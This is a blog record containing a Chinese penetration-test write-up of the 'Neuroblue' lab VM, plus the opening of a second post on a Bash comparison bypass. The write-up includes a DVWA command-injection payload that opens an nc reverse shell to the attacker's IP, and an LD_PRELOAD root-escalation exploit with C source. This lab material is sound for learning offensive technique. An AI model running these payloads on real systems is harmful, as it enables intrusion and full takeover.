"docs/post/shen-tou-ce-shi-bao-gao- - Neuroblue (-ce-shi-ba-ji-).html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u6e17\u900f\u6d4b\u8bd5\u62a5\u544a - Neuroblue (\u6d4b\u8bd5\u9776\u673a)", "postUrl": "post/shen-tou-ce-shi-bao-gao-%20-%20Neuroblue%20%28-ce-shi-ba-ji-%29.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/12", "commentNum": 0, "wordCount": 10633, "description": "## \u6e17\u900f\u6d4b\u8bd5\u62a5\u544a - Neuroblue\n\n## 1. \u7b80\u4ecb\n\n**\u9776\u673a\u540d\u79f0**: Neuroblue\n**\u96be\u5ea6**: \u7b80\u5355\n**\u653b\u51fb\u8005 IP:** `192.168.205.188` (Kali Linux)\n**\u76ee\u6807 IP:** `192.168.205.203` (Neuroblue)\n\n## 2. \u4fe1\u606f\u6536\u96c6 (Enumeration)\n\n### 2.1. \u7f51\u7edc\u53d1\u73b0 (Network Discovery)\n\n\u4f7f\u7528 `arp-scan` \u5728\u672c\u5730\u7f51\u7edc\u4e2d\u63a2\u6d4b\u5b58\u6d3b\u4e3b\u673a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo arp-scan -l        \nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.188\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       (Unknown)\n192.168.205.2   00:50:56:f4:ef:6f       (Unknown)\n192.168.205.203 08:00:27:53:84:22       (Unknown) # <-- \u53d1\u73b0\u76ee\u6807\n192.168.205.254 00:50:56:ec:d6:ae       (Unknown)\n\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.871 seconds (136.83 hosts/sec). 4 responded\n```\n\n\u76ee\u6807\u4e3b\u673a IP \u786e\u5b9a\u4e3a `192.168.205.203`\u3002MAC \u5730\u5740 `08:00:27:53:84:22`\u3002\n\n### 2.2. \u7aef\u53e3\u626b\u63cf (Port Scanning)\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u8bc6\u522b\u5f00\u653e\u7684 TCP \u7aef\u53e3\u3002\n\n* \u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf (`-p-`) \u786e\u5b9a\u5f00\u653e\u7aef\u53e3\u3002\n\n  ```bash\n  \u250c\u2500\u2500(kali\u327fkali)-[~]\n  \u2514\u2500$ nmap -p- 192.168.205.203 \n  Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-01 02:10 EDT\n  Nmap scan report for 192.168.205.203\n  Host is up (0.00014s latency).\n  Not shown: 65533 closed tcp ports (reset)\n  PORT   STATE SERVICE\n  22/tcp open  ssh\n  80/tcp open  http\n  MAC Address: 08:00:27:53:84:22 (PCS Systemtechnik/Oracle VirtualBox virtual NIC) # <-- \u786e\u8ba4 VirtualBox\n  \n  Nmap done: 1 IP address (1 host up) scanned in 5.15 seconds\n  ```\n\n  \u7ed3\u679c\u663e\u793a\u76ee\u6807\u5f00\u653e\u4e86\u4e24\u4e2a\u5e38\u89c1\u7684\u7aef\u53e3\uff1a`22 (SSH)` \u548c `80 (HTTP)`\u3002\n\n### 2.3. Web \u670d\u52a1\u63a2\u6d4b (Web Enumeration)\n\n\u8bbf\u95ee 80 \u7aef\u53e3\u7684 HTTP \u670d\u52a1 `http://192.168.205.203/wordpress/`\u3002\n\n![DVWA Login Page](https://7r1umphk.github.io/image/20250501141142075.png)\n\n\u9875\u9762\u663e\u793a\u4e3a DVWA (Damn Vulnerable Web Application) \u7684\u767b\u5f55\u754c\u9762\u3002DVWA \u662f\u4e00\u4e2a\u77e5\u540d\u7684\u6545\u610f\u5305\u542b\u6f0f\u6d1e\u7684 Web \u5e94\u7528\uff0c\u7528\u4e8e\u5b89\u5168\u6d4b\u8bd5\u548c\u5b66\u4e60\u3002\n\nDVWA \u901a\u5e38\u6709\u9ed8\u8ba4\u7684\u767b\u5f55\u51ed\u636e\u3002\n\n![DVWA Logged In](https://7r1umphk.github.io/image/20250501141310014.png)\n\n## 3. \u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650 (Initial Access - DVWA Command Injection)\n\n### 3.1. \u6f0f\u6d1e\u53d1\u73b0\u4e0e\u5229\u7528 (Vulnerability Discovery & Exploitation)\n\n* **\u767b\u5f55 DVWA:** \u5c1d\u8bd5\u4f7f\u7528 DVWA \u7684\u9ed8\u8ba4\u51ed\u636e `admin` / `password`\u3002\u6210\u529f\u767b\u5f55\u3002\n\n  ![image-20250501141405799](https://7r1umphk.github.io/image/20250501141405948.png)\n\n* **\u5bfb\u627e\u6ce8\u5165\u70b9:** \u6d4f\u89c8 DVWA \u7684\u529f\u80fd\u6a21\u5757\uff0c\u53d1\u73b0 'Command Injection' \u6a21\u5757\u3002\n\n* **\u521d\u6b65\u6d4b\u8bd5:** \u5c1d\u8bd5\u6267\u884c\u7b80\u5355\u547d\u4ee4\uff0c\u5982 `127.0.0.1; id`\u3002\n\n  ![Initial Command Injection Attempt (Blocked)](https://7r1umphk.github.io/image/20250501141546233.png)\n\n  \u521d\u59cb\u5c1d\u8bd5\u88ab DVWA \u7684\u5b89\u5168\u7ea7\u522b\u963b\u6b62\u3002\n\n* **\u964d\u4f4e\u5b89\u5168\u7ea7\u522b:** DVWA \u5141\u8bb8\u8c03\u6574\u5b89\u5168\u7ea7\u522b\u3002\u5bfc\u822a\u5230 'DVWA Security' \u9875\u9762\uff0c\u5c06\u5b89\u5168\u7ea7\u522b\u8bbe\u7f6e\u4e3a 'Low'\u3002\n\n  ![Setting Security Level to Low](https://7r1umphk.github.io/image/20250501141634505.png)\n\n* **\u518d\u6b21\u6d4b\u8bd5:** \u5728 'Low' \u5b89\u5168\u7ea7\u522b\u4e0b\uff0c\u518d\u6b21\u5c1d\u8bd5\u547d\u4ee4\u6ce8\u5165\u3002\u8f93\u5165 `127.0.0.1; id`\u3002\n\n  ![Successful Command Injection (Low Security)](https://7r1umphk.github.io/image/20250501141746295.png)\n\n  \u547d\u4ee4 `id` \u6210\u529f\u6267\u884c\uff0c\u786e\u8ba4\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u3002\n\n* **\u6784\u9020\u53cd\u5f39 Shell Payload:** \u4e3a\u4e86\u83b7\u53d6\u4ea4\u4e92\u5f0f Shell\uff0c\u6784\u9020\u4e00\u4e2a\u53cd\u5f39 Shell Payload\u3002\n  Payload: `127.0.0.1;nc 192.168.205.188 8888 -e /bin/bash`\n\n* **\u8bbe\u7f6e\u76d1\u542c\u5668:** \u5728\u653b\u51fb\u673a (Kali) \u4e0a\u4f7f\u7528 `nc` \u8bbe\u7f6e\u76d1\u542c\u5668\uff0c\u7b49\u5f85\u53cd\u5f39\u8fde\u63a5\u3002\n\n  ```bash\n  \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/test]\n  \u2514\u2500$ nc -lvnp 8888            \n  listening on [any] 8888 ...\n  ```\n\n* **\u6267\u884c Payload:** \u5728 DVWA \u7684\u547d\u4ee4\u6ce8\u5165\u9875\u9762\u63d0\u4ea4\u53cd\u5f39 Shell Payload\u3002\n\n### 3.2. \u83b7\u53d6 Shell (Gaining Access)\n\n\u63d0\u4ea4 Payload \u540e\uff0cDVWA \u9875\u9762\u4f1a\u6301\u7eed\u52a0\u8f7d\u3002\u8fd4\u56de Kali \u7ec8\u7aef\uff0c\u76d1\u542c\u5668\u5e94\u6536\u5230\u8fde\u63a5\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/test]\n\u2514\u2500$ nc -lvnp 8888            \nlistening on [any] 8888 ...\nconnect to [192.168.205.188] from (UNKNOWN) [192.168.205.203] 35542 # <-- \u8fde\u63a5\u6210\u529f\n```\n\n* **\u7a33\u5b9a Shell:** \u83b7\u5f97\u7684\u521d\u59cb Shell \u901a\u5e38\u529f\u80fd\u6709\u9650\u3002\u4f7f\u7528\u6807\u51c6\u6280\u672f\u63d0\u5347\u4e3a\u529f\u80fd\u66f4\u5168\u7684 TTY Shell\u3002\n\n  ```bash\n  # \u5728\u53cd\u5f39 shell \u4e2d\u6267\u884c\n  script /dev/null -c bash  \n  # \u6309 Ctrl+Z \u6682\u505c\n  # \u5728 Kali \u7ec8\u7aef\u6267\u884c\n  stty raw -echo; fg  \n  # \u6309 Enter \u6062\u590d\uff0c\u7136\u540e\u7ee7\u7eed\u5728\u53cd\u5f39 shell \u4e2d\u6267\u884c\n  reset xterm  \n  export TERM=xterm  \n  export SHELL=/bin/bash  \n  stty rows 40 columns 178 # \u53ef\u9009\uff0c\u8c03\u6574\u5927\u5c0f\n  ```\n\n* **\u786e\u8ba4\u7528\u6237:** \u68c0\u67e5\u5f53\u524d\u7528\u6237\u8eab\u4efd\u3002\n\n  ```bash\n  www-data@Neuroblue:/var/www/html/wordpress/vulnerabilities/exec$ id\n  uid=33(www-data) gid=33(www-data) groups=33(www-data) \n  ```\n\n  \u6210\u529f\u4ee5 `www-data` \u7528\u6237\u8eab\u4efd\u83b7\u5f97\u521d\u59cb\u8bbf\u95ee\u6743\u9650\u3002\n\n## 4. \u6743\u9650\u63d0\u5347 (`www-data` -> `welcome` -> `root`)\n\n### 4.1. \u4ee5 `www-data` \u8eab\u4efd\u8fdb\u884c\u4fe1\u606f\u6536\u96c6 (Enumeration as `www-data`)\n\n* **\u63a2\u7d22\u5bb6\u76ee\u5f55:** \u68c0\u67e5 `/home` \u76ee\u5f55\u3002\n\n  ```bash\n  www-data@Neuroblue:/var/www/html/wordpress/vulnerabilities/exec$ cd /home/\n  www-data@Neuroblue:/home$ ls -al\n  total 12\n  drwxr-xr-x  3 root    root    4096 Apr 11 22:27 .\n  drwxr-xr-x 18 root    root    4096 Mar 18 20:37 ..\n  drwxrwxrwx  2 welcome welcome 4096 Apr 30 09:17 welcome\n  ```\n\n* **\u68c0\u67e5 `welcome` \u76ee\u5f55:** \u67e5\u770b `welcome` \u7528\u6237\u7684\u4e3b\u76ee\u5f55\u5185\u5bb9\u3002\n\n  ```bash\n  www-data@Neuroblue:/home$ cd welcome/\n  www-data@Neuroblue:/home/welcome$ ls -al\n  total 48\n  drwxrwxrwx 2 welcome welcome  4096 Apr 30 09:17 .\n  drwxr-xr-x 3 root    root     4096 Apr 11 22:27 ..\n  lrwxrwxrwx 1 root    root        9 Apr 30 07:10 .bash_history -> /dev/null\n  -rw-r--r-- 1 welcome welcome   220 Apr 11 22:27 .bash_logout\n  -rw-r--r-- 1 welcome welcome  3526 Apr 11 22:27 .bashrc\n  -rw-r--r-- 1 welcome welcome   807 Apr 11 22:27 .profile\n  lrwxrwxrwx 1 root    root        9 Apr 30 09:17 .viminfo -> /dev/null\n  -rwx--x--x 1 root    root    22208 Apr 30 08:09 2048_hack # <-- \u53ef\u6267\u884c\u6587\u4ef6\n  -rw-r--r-- 1 root    root       44 Apr 30 07:10 user.txt # <-- \u7528\u6237 Flag\n  ```\n\n* **\u83b7\u53d6 User Flag:** \u8bfb\u53d6 `user.txt`\u3002\n\n  ```bash\n  www-data@Neuroblue:/home/welcome$ cat user.txt \n  flag{user-aa85e179cb0acf7cc4da7d2afcd53488}\n  ```\n\n* **\u5206\u6790 `2048_hack` \u7a0b\u5e8f:** \u68c0\u67e5\u8fd9\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5e2e\u52a9\u4fe1\u606f\u3002\n\n  ```bash\n  www-data@Neuroblue:/home/welcome$ ./2048_hack --help\n  Usage: 2048 [OPTION] | [MODE]\n  Play the game 2048 in the console\n  \n  Options:\n    -h,  --help       Show this help message.\n    -v,  --version    Press x. # <-- \u6709\u8da3\u7684\u63d0\u793a\n  \n  Modes:\n    bluered      Use a blue-to-red color scheme (requires 256-color terminal support).\n    blackwhite   The black-to-white color scheme (requires 256-color terminal support).\n  ```\n\n  \u63d0\u793a 'Press x' \u503c\u5f97\u6ce8\u610f\u3002\n\n* **\u8fd0\u884c `2048_hack` \u5e76\u4ea4\u4e92:** \u8fd0\u884c\u7a0b\u5e8f\u5e76\u6309 'x' \u952e\u3002\n\n  ```bash\n  www-data@Neuroblue:/home/welcome$ ./2048_hack \n  # (\u7a0b\u5e8f\u542f\u52a8\uff0c\u7528\u6237\u6309 'x')\n  ```\n\n  ![2048_hack output after pressing x](https://7r1umphk.github.io/image/20250501142419714.png)\n\n  \u7a0b\u5e8f\u63d0\u793a\u51ed\u636e\u5df2\u4fdd\u5b58\u5230 `/home/welcome/.cred`\u3002\n\n* **\u83b7\u53d6\u51ed\u636e:** \u67e5\u770b\u65b0\u521b\u5efa\u7684 `.cred` \u6587\u4ef6\u3002\n\n  ```bash\n  www-data@Neuroblue:/home/welcome$ ls -la\n  total 52\n  drwxrwxrwx 2 welcome  welcome   4096 May  1 02:23 .\n  drwxr-xr-x 3 root     root      4096 Apr 11 22:27 ..\n  lrwxrwxrwx 1 root     root         9 Apr 30 07:10 .bash_history -> /dev/null\n  -rw-r--r-- 1 welcome  welcome    220 Apr 11 22:27 .bash_logout\n  -rw-r--r-- 1 welcome  welcome   3526 Apr 11 22:27 .bashrc\n  -rw-r--r-- 1 www-data www-data    52 May  1 02:23 .cred\n  -rw-r--r-- 1 welcome  welcome    807 Apr 11 22:27 .profile\n  lrwxrwxrwx 1 root     root         9 Apr 30 09:17 .viminfo -> /dev/null\n  -rwx--x--x 1 root     root     22208 Apr 30 08:09 2048_hack\n  -rw-r--r-- 1 root     root        44 Apr 30 07:10 user.txt\n  www-data@Neuroblue:/home/welcome$ cat .cred\n  77656c636f6d653a666438363966363639333039613737636464\n  ```\n\n  \u8fd9\u662f\u4e00\u4e32\u5341\u516d\u8fdb\u5236\u7f16\u7801\u7684\u5b57\u7b26\u4e32\u3002\n\n* **\u89e3\u7801\u51ed\u636e:** \u4f7f\u7528\u5de5\u5177\uff08\u5982 CyberChef \u6216\u5728\u7ebf\u8f6c\u6362\u5668\uff09\u5c06\u5341\u516d\u8fdb\u5236\u89e3\u7801\u4e3a ASCII\u3002\n\n  ![Hex to ASCII conversion](https://7r1umphk.github.io/image/20250501142514282.png)\n\n  \u89e3\u7801\u7ed3\u679c\u4e3a\uff1a`welcome:fd869f669309a77cdd`\u3002\u8fd9\u662f `welcome` \u7528\u6237\u7684\u51ed\u636e\u3002\n\n### 4.2. \u5207\u6362\u7528\u6237 (`www-data` -> `welcome`)\n\n\u4f7f\u7528\u83b7\u53d6\u5230\u7684\u51ed\u636e\u5207\u6362\u5230 `welcome` \u7528\u6237\u3002\n\n```bash\nwww-data@Neuroblue:/home/welcome$ su welcome\nPassword: \nwelcome@Neuroblue:~$ id\nuid=1000(welcome) gid=1000(welcome) groups=1000(welcome)\n```\n\n\u6210\u529f\u5207\u6362\u5230 `welcome` \u7528\u6237\u3002\n\n### 4.3. \u4ee5 `welcome` \u8eab\u4efd\u8fdb\u884c\u4fe1\u606f\u6536\u96c6 (\u5bfb\u627e\u63d0\u6743\u5411\u91cf)\n\n\u68c0\u67e5 `welcome` \u7528\u6237\u7684 `sudo` \u6743\u9650\u3002\n\n```bash\nwelcome@Neuroblue:/tmp$ sudo -l\nMatching Defaults entries for welcome on Neuroblue:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser welcome may run the following commands on Neuroblue:\n    (root) NOPASSWD: /opt/export # <-- \u5141\u8bb8\u4ee5 root \u65e0\u5bc6\u7801\u6267\u884c /opt/export\n```\n\n\u540c\u65f6\uff0c\u67e5\u770b `/opt/export` \u811a\u672c\u7684\u5185\u5bb9\u548c\u6743\u9650\uff1a\n\n```bash\nwelcome@Neuroblue:/tmp$ cat /opt/export\n#!/bin/bash\n\nif [ -z $1 ] ;then\n        echo 'This is VMBreaker export program.'\n        /usr/local/sbin/VMBreaker\n        exit 1\nfi\n\nexport '$1'='$2' # <-- \u5173\u952e\uff1a\u4f7f\u7528\u53c2\u6570\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\nexport '$3'='$4'\nexport '$5'='$6'\nexport '$7'='$8'\n/usr/local/sbin/VMBreaker # <-- \u6700\u540e\u6267\u884c\u53e6\u4e00\u4e2a\u7a0b\u5e8f\n\nwelcome@Neuroblue:/tmp$ ls -al /opt/export \n-rwxr-xr-x 1 root root 207 Apr 30 08:55 /opt/export\n```\n\n**\u5173\u952e\u53d1\u73b0:**\n\n1.  `welcome` \u7528\u6237\u53ef\u4ee5\u65e0\u9700\u5bc6\u7801\u4ee5 root \u6743\u9650\u6267\u884c `/opt/export`\u3002\u8fd9\u662f\u63d0\u6743\u7684\u5165\u53e3\u3002\n2.  `sudoers` \u914d\u7f6e\u4e2d\u5305\u542b `env_reset`\uff0c\u8fd9\u610f\u5473\u7740\u901a\u8fc7 `sudo` \u76f4\u63a5\u4f20\u9012 `LD_PRELOAD` \u73af\u5883\u53d8\u91cf\uff08\u5982 `sudo LD_PRELOAD=... /opt/export`\uff09\u4f1a\u88ab\u963b\u6b62\u3002\n3.  `/opt/export` \u811a\u672c\u672c\u8eab\u5b58\u5728\u4e00\u4e2a**\u4e25\u91cd\u6f0f\u6d1e**\uff1a\u5b83\u5c06\u547d\u4ee4\u884c\u53c2\u6570\u76f4\u63a5\u7528\u4f5c `export` \u547d\u4ee4\u7684\u53c2\u6570\uff0c\u5141\u8bb8\u6211\u4eec\u63a7\u5236\u811a\u672c\u5185\u90e8\u8bbe\u7f6e\u7684\u73af\u5883\u53d8\u91cf\u540d\u79f0\u548c\u503c\u3002\n4.  \u811a\u672c\u6700\u540e\u4f1a\u6267\u884c `/usr/local/sbin/VMBreaker`\u3002\n\n### 4.4. \u5229\u7528\u7b56\u7565 (Exploitation Strategy - Exploiting Script Argument Handling for LD_PRELOAD Injection)\n\n\u6211\u4eec\u7684\u76ee\u6807\u662f\u5229\u7528 `/opt/export` \u811a\u672c\u7684\u6f0f\u6d1e\u6765\u8bbe\u7f6e `LD_PRELOAD` \u73af\u5883\u53d8\u91cf\uff0c\u4ece\u800c\u52ab\u6301\u540e\u7eed `/usr/local/sbin/VMBreaker` \u7684\u6267\u884c\u6d41\u7a0b\u3002\n\n\u8ba1\u5212\uff1a\n\n1.  \u7f16\u5199\u4e00\u4e2a C \u6587\u4ef6 (`exp.c`)\uff0c\u5305\u542b\u4e00\u4e2a\u6784\u9020\u51fd\u6570 (`__attribute__((constructor))`)\u3002\u8fd9\u4e2a\u51fd\u6570\u4f1a\u5728\u5e93\u88ab\u52a0\u8f7d\u65f6\u81ea\u52a8\u6267\u884c\uff0c\u5176\u529f\u80fd\u662f\u8bbe\u7f6e `uid` \u548c `gid` \u4e3a 0\uff0c\u7136\u540e\u542f\u52a8\u4e00\u4e2a\u5177\u6709 root \u6743\u9650\u7684 shell (`/bin/bash -p`)\u3002\n2.  \u5c06 `exp.c` \u7f16\u8bd1\u6210\u5171\u4eab\u5e93\u6587\u4ef6 `/tmp/exp.so`\u3002\n3.  \u6267\u884c `sudo /opt/export` \u547d\u4ee4\uff0c\u5de7\u5999\u5730\u5c06 `LD_PRELOAD` \u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570 (`$1`)\uff0c\u5c06\u6211\u4eec\u6076\u610f\u5e93\u7684\u8def\u5f84 `/tmp/exp.so` \u4f5c\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570 (`$2`) \u4f20\u9012\u7ed9\u811a\u672c\u3002\n4.  \u811a\u672c\u6267\u884c\u5230 `export '$1'='$2'` \u65f6\uff0c\u5c31\u4f1a\u5728 **root \u6743\u9650**\u4e0b\u6267\u884c `export LD_PRELOAD=/tmp/exp.so`\u3002\n5.  \u5f53\u811a\u672c\u6700\u540e\u6267\u884c `/usr/local/sbin/VMBreaker` \u65f6\uff0c\u7531\u4e8e `LD_PRELOAD` \u73af\u5883\u53d8\u91cf\u5df2\u88ab\u8bbe\u7f6e\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u4f18\u5148\u52a0\u8f7d `/tmp/exp.so`\uff0c\u4ece\u800c\u6267\u884c\u6211\u4eec\u7684\u6076\u610f\u4ee3\u7801\uff0c\u83b7\u5f97 root shell\u3002\n\n### 4.5. \u6267\u884c\u5229\u7528 (Executing the Exploit)\n\n1. **\u521b\u5efa\u6076\u610f C \u4ee3\u7801:**\n   \u5207\u6362\u5230\u53ef\u5199\u76ee\u5f55 `/tmp`\uff0c\u521b\u5efa `exp.c` \u6587\u4ef6\u3002\n\n   ```bash\n   welcome@Neuroblue:~$ cd /tmp\n   welcome@Neuroblue:/tmp$ cat << EOF > exp.c\n   #define _GNU_SOURCE\n   #include <stdio.h>\n   #include <stdlib.h>\n   #include <unistd.h>\n   #include <dlfcn.h>\n   \n   // \u6784\u9020\u51fd\u6570\uff0c\u5728\u5e93\u52a0\u8f7d\u65f6\u81ea\u52a8\u6267\u884c\n   void __attribute__((constructor)) _init() {\n       unsetenv('LD_PRELOAD'); // \u6e05\u7406\u73af\u5883\u53d8\u91cf\uff0c\u907f\u514d\u5f71\u54cd\u5b50shell\n       setuid(0);             // \u8bbe\u7f6eUID\u4e3aroot\n       setgid(0);             // \u8bbe\u7f6eGID\u4e3aroot\n       system('/bin/bash -p'); // \u6267\u884c\u4e00\u4e2a\u4fdd\u7559\u6743\u9650\u7684root shell\n       exit(0); // \u6267\u884c\u5b8cshell\u540e\u9000\u51fa\uff0c\u907f\u514d\u540e\u7eed\u7a0b\u5e8f\u6267\u884c\uff08\u53ef\u9009\uff09\n   }\n   EOF\n   ```\n\n2. **\u7f16\u8bd1\u5171\u4eab\u5e93:**\n   \u4f7f\u7528 `gcc` \u7f16\u8bd1 C \u4ee3\u7801\u4e3a\u5171\u4eab\u5e93\u3002\n\n   ```bash\n   welcome@Neuroblue:/tmp$ gcc -fPIC -shared -o /tmp/exp.so /tmp/exp.c -nostartfiles\n   welcome@Neuroblue:/tmp$ ls -l /tmp/exp.so\n   -rwxr-xr-x 1 welcome welcome 14736 May  1 02:29 /tmp/exp.so # <-- \u7f16\u8bd1\u6210\u529f\n   ```\n\n3. **\u89e6\u53d1\u6f0f\u6d1e\u5e76\u6ce8\u5165:**\n   \u6267\u884c `sudo /opt/export` \u547d\u4ee4\uff0c\u5e76\u4f20\u9012\u7cbe\u5fc3\u6784\u9020\u7684\u53c2\u6570\u3002\n\n   ```bash\n   welcome@Neuroblue:/tmp$ sudo /opt/export LD_PRELOAD /tmp/exp.so '' '' '' '' '' ''\n   # \u6b64\u5904\u811a\u672c\u5185\u90e8\u6267\u884c export LD_PRELOAD=/tmp/exp.so\n   # \u7136\u540e\u6267\u884c /usr/local/sbin/VMBreaker\n   # VMBreaker \u52a0\u8f7d\u65f6\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u53d1\u73b0 LD_PRELOAD\uff0c\u52a0\u8f7d exp.so\n   # exp.so \u7684\u6784\u9020\u51fd\u6570\u88ab\u6267\u884c...\n   root@Neuroblue:/tmp# \n   ```\n\n### 4.6. \u83b7\u53d6 Root \u6743\u9650 (Gaining Root Access)\n\n\u6210\u529f\u6267\u884c\u4e0a\u8ff0 `sudo` \u547d\u4ee4\u540e\uff0c`/tmp/exp.so` \u4e2d\u7684\u6784\u9020\u51fd\u6570\u88ab\u89e6\u53d1\uff0c\u6211\u4eec\u76f4\u63a5\u83b7\u5f97\u4e86\u4e00\u4e2a root \u6743\u9650\u7684 shell\u3002\n\n```bash\nroot@Neuroblue:/tmp# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@Neuroblue:/tmp# whoami\nroot\n```\n\n\u6210\u529f\u83b7\u53d6 root \u6743\u9650\u3002\n\n* **\u83b7\u53d6 Root Flag:** \u8bfb\u53d6 `/root/root.txt` \u6587\u4ef6\u3002\n\n  ```bash\n  root@Neuroblue:/tmp# cat /root/root.txt \n  flag{root-3960a29b415a278c2d88bb0543c5f283}\n  ```\n\n\n\n**\u6ce8\u8bb0\uff1a** \u5728\u672c\u62a5\u544a\u7684\u64b0\u5199\u8fc7\u7a0b\u4e2d\uff0cAI \u8bed\u8a00\u6a21\u578b\u4e3a\u90e8\u5206\u7ae0\u8282\u7684\u6587\u672c\u7ec4\u7ec7\u3001\u6982\u5ff5\u9610\u8ff0\u53ca\u8bed\u8a00\u4f18\u5316\u63d0\u4f9b\u4e86\u8f85\u52a9\u652f\u6301\u3002sentence", "top": 0, "createdAt": 1751016494, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P14": {"htmlDir": "docs/post/qun-zhu-ti-hou-xu- `-ne` -rao-guo- - -bian-liang-jie-xi-yu- Python 2 `input()` -de-qi-shi.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u7fa4\u4e3b\u9898\u540e\u7eed `-ne` \u7ed5\u8fc7 - \u53d8\u91cf\u89e3\u6790\u4e0e Python 2 `input()` \u7684\u542f\u793a", "postUrl": "post/qun-zhu-ti-hou-xu-%20%60-ne%60%20-rao-guo-%20-%20-bian-liang-jie-xi-yu-%20Python%202%20%60input%28%29%60%20-de-qi-shi.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/14", "commentNum": 0, "wordCount": 3203, "description": "## \u524d\u8a00\n\n\u5728\u4e4b\u524d\u7684 [WP](https://7r1umph.github.io/post/qun-zhu-ti.html) \u4e2d\uff0c\u6211\u4eec\u8ba8\u8bba\u4e86\u5982\u4f55\u901a\u8fc7\u8f93\u5165\u975e\u6574\u6570\u5b57\u7b26\u4e32\uff08\u5982 `aaa`\uff09\u6765\u7ed5\u8fc7 Bash \u811a\u672c\u4e2d `[[ '$INPUTS' -ne '$a' ]]` \u7684\u968f\u673a\u6570\u68c0\u67e5\u3002\u5176\u539f\u7406\u662f `-ne` \u7b97\u672f\u6bd4\u8f83\u5728\u9047\u5230\u975e\u6574\u6570\u65f6\u64cd\u4f5c\u5931\u8d25\uff0c\u5bfc\u81f4 `[[` \u547d\u4ee4\u8fd4\u56de\u975e\u96f6\u9000\u51fa\u72b6\u6001\uff0c\u8fdb\u800c\u4f7f `if` \u6761\u4ef6\u5224\u65ad\u4e3a\u5047\u3002\u7136\u800c\uff0c\u4e0e\u7fa4\u5185\u5927\u4f6c '\u4e91\u6de1_\u98ce\u6e05' \u7684\u4ea4\u6d41\u4ee5\u53ca\u4ed6\u7ed9\u51fa\u7684 `[[ a -ne '$a' ]]` \u793a\u4f8b\uff0c\u5f15\u5bfc\u6211\u4eec\u4ece\u53e6\u4e00\u4e2a\u89d2\u5ea6\u601d\u8003\u8fd9\u4e2a\u95ee\u9898\uff0c\u5e76\u8054\u60f3\u5230\u4e86 Python 2 `input()` \u7684\u884c\u4e3a\u3002\n\n## \u6311\u6218\u811a\u672c\u56de\u987e\n\n```bash\n#!/bin/bash\n# challenge2.sh\n\nPATH=/usr/bin\na=$((RANDOM%100)) # \u968f\u673a\u6570\u53d8\u91cf\u540d\u4e3a 'a'\necho $a\nread -r INPUTS\n\n# \u5173\u952e\u68c0\u67e5\u70b9: \u6ce8\u610f $INPUTS \u662f\u5e26\u5f15\u53f7\u7684\nif [[ '$INPUTS' -ne '$a' ]]; then\n    exit 1\nfi\n\necho '\u9a8c\u8bc1\u901a\u8fc7!'\n# ... \u540e\u7eed eval \u6ce8\u5165 ...\n```\n\n## \u5927\u4f6c\u7684\u89c6\u89d2\uff1a`[[ a -ne '$a' ]]` \u7684\u6df1\u610f\n\n\u5927\u4f6c\u901a\u8fc7\u5bf9\u6bd4 `[[ a -ne '$a' ]]` \u548c `[[ b -ne '$a' ]]`\uff08\u5047\u8bbe `b` \u672a\u5b9a\u4e49\uff09\u7684\u884c\u4e3a\uff0c\u60f3\u63ed\u793a `[[ ]]` \u5185\u90e8\u7684\u4e00\u4e2a\u91cd\u8981\u7279\u6027\uff1a**\u5f53\u4e00\u4e2a\u5b57\u7b26\u4e32\u5728 `[[ ]]` \u5185\u90e8\u6ca1\u6709\u88ab\u5f15\u53f7\u5305\u56f4\u65f6\uff0c\u5982\u679c\u5b83\u770b\u8d77\u6765\u50cf\u4e00\u4e2a\u5408\u6cd5\u7684\u53d8\u91cf\u540d\uff0cBash \u53ef\u80fd\u4f1a\u5c1d\u8bd5\u5c06\u5176\u4f5c\u4e3a\u53d8\u91cf\u8fdb\u884c\u6269\u5c55 (Variable Expansion)\u3002**\n\n![9a30eabc231f090b377fe74e23943c46](https://7r1umphk.github.io/image/20250409090621789.jpeg)\n\n*   **\u793a\u4f8b 1: `[[ a -ne '$a' ]]`**\n    \u5047\u8bbe\u811a\u672c\u4e2d\u7684\u968f\u673a\u6570\u53d8\u91cf\u5c31\u662f `a` (\u4f8b\u5982 `a=42`)\u3002\u5728\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u4e2d\uff1a\n    1.  \u7b2c\u4e00\u4e2a `a` **\u6ca1\u6709\u5f15\u53f7**\u3002Bash \u4f1a\u5c1d\u8bd5\u67e5\u627e\u540d\u4e3a `a` \u7684\u53d8\u91cf\u3002\n    2.  \u5b83\u627e\u5230\u4e86\uff0c\u503c\u4e3a `42`\u3002\u8868\u8fbe\u5f0f\u53d8\u4e3a `[[ 42 -ne '$a' ]]`\u3002\n    3.  